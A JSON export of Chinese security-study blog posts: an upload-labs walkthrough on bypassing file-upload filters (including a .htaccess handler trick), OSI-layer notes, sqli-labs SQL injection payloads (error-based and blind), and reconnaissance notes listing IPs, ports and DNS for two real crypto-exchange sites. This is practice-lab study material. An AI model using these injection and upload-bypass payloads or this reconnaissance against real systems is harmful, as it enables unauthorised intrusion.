[{"title":"uploadlabs题解","url":"/posts/undefined/","content":"第一关：\n前端js函数白名单过滤\n方法1：BP抓包改文件，先把php后缀改成白名单里的，然后抓包在改回来绕过前端\n方法2：在浏览器设置里关闭js函数\n方法3：在consel里运行改过的html源码（亲测未成功，js路径报错）\n\n第二关：\n对于content-type的检验\nBP将text/plain 改为image/gif\n\n第三关：\n黑名单后缀\n用类似等效的后缀代替（亦或是大小写）\n比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码\n大小写都可 如.PhP .pHP(亲测失败)\n\n第四关：\n更全的黑名单\n.htaccess，于是首先上传一个.htaccess内容如下的文件:\nSetHandler application/x-httpd-php\n这样所有文件都会解析为php，然后再上传图片马，就可以解析：\n\n第五关：\n黑名单，加上了.htaccess，但是没有将后缀进行大小写统一，于是可以通过大小写绕过，在content-disposition filename=xxx.phP","categories":[],"tags":[]},{"title":"OSI七层协议","url":"/posts/undefined/","content":"# OSI七层协议\n\n[](https://img-my.csdn.net/uploads/201201/5/0_1325744597WM32.gif)\n\n## 第一层：物理层\n\n用于传输介质中提供物理连接，实现比特流的透明传输。物理层的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。\n\n## 第二层：数据链路层\n\n负责建立和管理节点间的链路。该层的主要功能是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。\n在计算机网络中由于各种干扰的存在，物理链路是不可靠的。因此，这一层的主要功能是在物理层提供的比特流的基础上，通过差错控制、流量控制方法，使有差错的物理线路变为无差错的数据链路，即提供可靠的通过物理介质传输数据的方法。\n\n大致是用于局域网里的根据端口的MAC地址做转发的协议\n\n## 第三层：网络层\n\n主要功能是控制子网的运行。通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。该层控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。具体地说，数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。\n一般地，数据链路层是解决同一网络内节点之间的通信，而网络层主要解决不同子网间的通信。例如在广域网之间通信时，必然会遇到路由（即两节点间可能有多条路径）选择问题。 \n\n选择最好的路由线路，已获得最好的速度，比如有三条路可以走这层协议负责选取最短的路径。\n\n## 第四层：传输层\n\n该层的主要任务是：向用户提供可靠的端到端的差错和流量控制，保证报文的正确传输。传输层的作用是向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。该层常见的协议：TCP/IP中的TCP协议、Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议。\n传输层提供会话层和网络层之间的传输服务，这种服务从会话层获得数据，并在必要时，对数据进行分割。然后，传输层将数据传递到网络层，并确保数据能正确无误地传送到网络层。因此，传输层负责提供两节点之间数据的可靠传送，当两节点的联系确定之后，传输层则负责监督工作。综上，传输层的主要功能如下：\n传输连接管理：提供建立、维护和拆除传输连接的功能。传输层在网络层的基础上为高层提供“面向连接”和“面向无接连”的两种服务。\n处理传输差错：提供可靠的“面向连接”和不太可靠的“面向无连接”的数据传输服务、差错控制和流量控制。在提供“面向连接”服务时，通过这一层传输的数据将由目标设备确认，如果在指定的时间内未收到确认信息，数据将被重发。\n监控服务质量。\n\n负责数据包的重组和排序，从网络层获取的碎片式的数据包重新排序成原文。\n\n## 第五层：会话层\n\n主要任务是：向两个实体的表示层提供建立和使用连接的方法。将不同实体之间的表示层的连接称为会话。因此会话层的任务就是组织和协调两个会话进程之间的通信，并对数据交换进行管理。\n会话层的具体功能如下：\n会话管理：允许用户在两个实体设备之间建立、维持和终止会话，并支持它们之间的数据交换。例如提供单方向会话或双向同时会话，并管理会话中的发送顺序，以及会话所占用时间的长短。\n 会话流量控制：提供会话流量控制和交叉会话功能。\n寻址：使用远程地址建立会话连接。\n出错控制：从逻辑上讲会话层主要负责数据交换的建立、保持和终止，但实际的工作却是接收来自传输层的数据，并负责纠正错误。会话控制和远程过程调用均属于这一层的功能。但应注意，此层检查的错误不是通信介质的错误，而是磁盘空间、打印机缺纸等类型的高级错误。\n\n为两端通信实体建立连接（会话），中间有认证鉴权以及检查点记录（供会话意外中断的时候可以继续，类似断点续传）。\n\n## 第六层：表示层\n\n其主要功能是“处理用户信息的表示问题，如编码、数据格式转换和加密解密”等。表示层的具体功能如下：\n数据格式处理：协商和建立数据交换的格式，解决各应用程序之间在数据格式表示上的差异。\n数据的编码：处理字符集和数字的转换。例如由于用户程序中的数据类型（整型或实型、有符号或无符号等）、用户标识等都可以有不同的表示方式，因此，在设备之间需要具有在不同字符集或格式之间转换的功能。\n压缩和解压缩：为了减少数据的传输量，这一层还负责数据的压缩与恢复。\n数据的加密和解密：可以提高网络的安全。\n\n决定数据的展现（编码）形式，如同一部电影可以采样、量化、编码为RMVB、AVI，一张图片能够是JPEG、BMP、PNG等。\n\n## 第七层：应用层\n\n它是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。它在其他6层工作的基础上，负责完成网络中应用程序与网络操作系统之间的联系，建立与结束使用者之间的联系，并完成网络用户提出的各种网络服务及应用所需的监督、管理和服务等各种协议。此外，该层还负责协调各个应用程序间的工作。\n\n如邮箱使用的POP3，SMTP、远程登录使用的Telnet、获取IP地址的DHCP、域名解析的DNS、网页浏览的http协议等；这部分协议主要是规定应用软件如何去进行通信的。\n\n## OSI7层模型的小结\n\n由于OSI是一个理想的模型，因此一般网络系统只涉及其中的几层，很少有系统能够具有所有的7层，并完全遵循它的规定。\n在7层模型中，每一层都提供一个特殊的网络功能。从网络功能的角度观察：下面4层（物理层、数据链路层、网络层和传输层）主要提供数据传输和交换功能，即以节点到节点之间的通信为主；第4层作为上下两部分的桥梁，是整个网络体系结构中最关键的部分；而上3层（会话层、表示层和应用层）则以提供用户与应用程序之间的信息和数据处理功能为主。简言之，下4层主要完成通信子网的功能，上3层主要完成资源子网的功能。","categories":[],"tags":[]},{"title":"sqlilabs 1~6","url":"/posts/undefined/","content":"# less 1~4\n\nselect TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='库名' LIMIT 0,1  //爆表（一次一个）\n\nselect group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479 //爆表 （全部）前面是数据库16进制的编码\n\nselect group_concat(column_name)from information_schema.columns where table_name=0x656d61696c73 //爆字段 前面是数据库16进制的编码\n\nselect group_concat(id字段名1，email_id字段名2 。。。。)from email（表名）//爆单个数据\n\n# 报错注入 （less-5，6）\n\n首先利用盲注的方法获取表名等，然后报错注入回显。（针对页面无回显点）\n\n\n\nid=-1' OR 1 GROUP BY CONCAT_WS(0x3a,database(),FLOOR(RAN(0)*2)) HAVING MIN(0) OR 1 --+ //库\n\nhttp://sql.com/Less-5/?id=1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x23))--+//表\n\nhttp://sql.com/Less-5/?id=1' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x23))--+  //字段\n\nhttp://sql.com/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>6--+//长度判断\n\nhttp://127.0.0.1/sqli/Less-5/?id=1’ and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) >100--+ 通过二分法猜解得到所有的库,红色为可变参数。\n\nhttp://127.0.0.1/sqli/Less-5/?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))>1--+  再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。\n\nhttp://127.0.0.1/sqli/Less-5/?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) >1 --+  通过二分法可猜解users内的字段，其中红色为可变参数。\n\nhttp://127.0.0.1/sqli/Less-5/?id=1’  and ascii(substr((select username from security.users limit 1,1),1,1))>1--+继续猜解即可得到字段内的值。","categories":[],"tags":[]},{"title":"www.umex.co","url":"/posts/undefined/","content":"www.umex.co（香港）\n========\n\n- **客服邮箱：[support@umex.zendesk.com](https://ooex.zendesk.com/hc/zh-cn/articles/support@ooex.zendesk.com)**\n\n  **App及官网上在线客服**\n\n  为提高沟通效率，有任何问题，优先联系App在线客服处理！\n\n  **微信\\**客服①\\**：BTC13120**\n\n  **微信客服②：mncl6625**\n\n  **微信客服③：AxiaomiaoC**\n\n   \n\n  ***\\*Q Q\\**\\**客服①\\**：595248930**\n\n  **Q Q客服②：835430720**\n\n  **Q Q客服③：1912087981**\n\n   \n\n  UMEX官网：[https://www.umex.co](https://www.umex.co/)\n\n  UMEX微博：https://weibo.com/UmexGlobal\n\n  Telegram中文群：https://t.me/Umex_cn\n\n  Facebook：https://www.facebook.com/UmExGlobal1\n\n  Twitter：https://twitter.com/UmexGlobal\n\n  Instagram：https://www.instagram.com/umexglobal\n\n  Medium：https://medium.com/@umexjames\n\n  Reddit：https://www.reddit.com/user/umex2018\n\n- 注册商：GoDaddy.com, Inc\n\n- 域名服务器\n\n  whois.godaddy.com\n\n- DNS\n\n  ns-991.awsdns-59.net\n  ns-1799.awsdns-32.co.uk\n  ns-84.awsdns-10.com\n  ns-1277.awsdns-31.org\n\n- 服务器类型\n\n  nginx / 1.16.1\n\n- 联系电话\n\n  +1 4806242505\n\n- IP:152.32.133.168\n\n- 开放端口：80/tcp  open  http     443/tcp open  https\n\n使用工具：Nmap shodan \n\n# www.senbit.com（新加坡）\n\n- 开放端口：\tport 443/tcp https  port 8888/tcp\n  \t\t\t\t \t\tport 80/tcp \n\n- IP； 159.138.48.236\n\n- 联系电话：同上\n\n- DNS；\n\n  NS1.JIASULE.NET（具有9,985个域）\n  NS2.JIASULE.NET（具有9,985个域\n\n- 服务器：Huawei Clouds\n\n- 应用框架\n\n![](img/1.png)\n\n","categories":[],"tags":[]}]